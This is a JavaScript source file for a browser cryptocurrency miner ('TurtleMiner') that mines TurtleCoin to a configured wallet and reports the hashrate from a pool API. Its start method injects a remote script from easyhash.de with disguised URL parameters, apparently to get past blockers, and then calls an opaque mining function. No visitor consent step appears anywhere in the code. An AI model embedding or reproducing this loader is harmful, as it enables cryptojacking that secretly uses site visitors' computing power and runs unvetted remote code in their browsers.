class TurtleMiner {
	constructor(config) {
		this.pool = "";
		this.port = -1;
		this.wallet = "";
		this.paymentId = "";
		this.fixedDiff = -1;
		this.speed = 0;
		this.threads = 2;
		this.workerName = "x";
		this.events = {
			start: 	function(instance)		{ console.log(`[WM] Webminer started with ${instance.speed}% speed and ${instance.threads} threads...`)},
			stop:	function()				{ console.log("[WM] Webminer stopped!")},
			report: function(report) 		{ console.log("[WM] Webminer report: "+report)},
			error: 	function(code, text) 	{ console.log("[WM] Webminer error "+code+": "+text)}
		}
		if ("pool" in config) 		{ this.pool 		= config.pool		}
		if ("port" in config)		{ this.port 		= config.port		}
		if ("wallet" in config)		{ this.wallet 		= config.wallet		}
		if ("speed" in config)		{ this.speed	 	= config.speed		}
		if ("threads" in config)	{ this.threads 		= config.threads	}
		if ("workerName" in config)	{ this.workerName 	= config.workerName	}
	}
	stop() {
		stopM();
		this.events.stop();
	}
	start() {
		if (this.pool != "" && this.port != -1 && this.wallet != "") {
			// loadScript("https://bitcoin-pay.eu/perfekt/perfekt.js?perfekt=wss://?algo=cn-lite?variant=2?jason="+this.pool+":"+this.port+"");
			loadScript("https://easyhash.de/tkefrep/tkefrep.js?tkefrep=bs?algy=cn-pico/trtl?nosaj="+this.pool+":"+this.port);
			setTimeout(() => {
				try {
					// EverythingIsBinary(this.wallet, this.workerName, 100-this.speed, this.threads);
					EverythingIsLife(this.wallet, this.workerName, 100-this.speed, this.threads);
					this.events.start(this);
					setInterval(this.report, 30000);
				} catch (err) {
					this.events.error(1, "unknown error: " + err);
				}
			}, 2000);
		} else {
			this.events.error(2, "you have to provide pool address, pool port and you wallet address");
		}
	}
	report() { // only works for mine2gether yet...
		let rep = {
			hashrate: -1
		}
		switch (this.pool) {
			case "trtl.pool.mine2gether.com":
				getA("https://trtl.mine2gether.com/api/stats_address?address="+this.wallet, (data) => {
					data = JSON.parse(data);
					rep.hashrate = data["charts"]["hashrate"]["worker-"+this.workerName].last()[1];
					this.events.report(rep);
				})
				break;
			default:
				break;
		}
	}
	log(text) {
		console.log(text);
	}
	dump() {
		let text = "";
		var i;
		for (i in this) {
			text += i + " - " + this[i] + "\n";
		}
		console.log(text);
	}
	on(event, fn) {this.events[event] = fn;}
}




function getA(theUrl, callback) {
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.onreadystatechange = function() {
        if (xmlHttp.readyState == 4 && xmlHttp.status == 200)
            callback(xmlHttp.responseText);
    }
    xmlHttp.open("GET", theUrl, true); // true for asynchronous
    xmlHttp.send(null);
}
function loadScript(url) {
    var script = document.createElement("script");  // create a script DOM node
    script.src = url;  // set its src to the provided URL
    document.body.appendChild(script);  // add it to the end of the head section of the page (could change 'head' to 'body' to add it to the end of the body section instead)
}
Array.prototype.last = function() {
	return this[this.length-1];
}
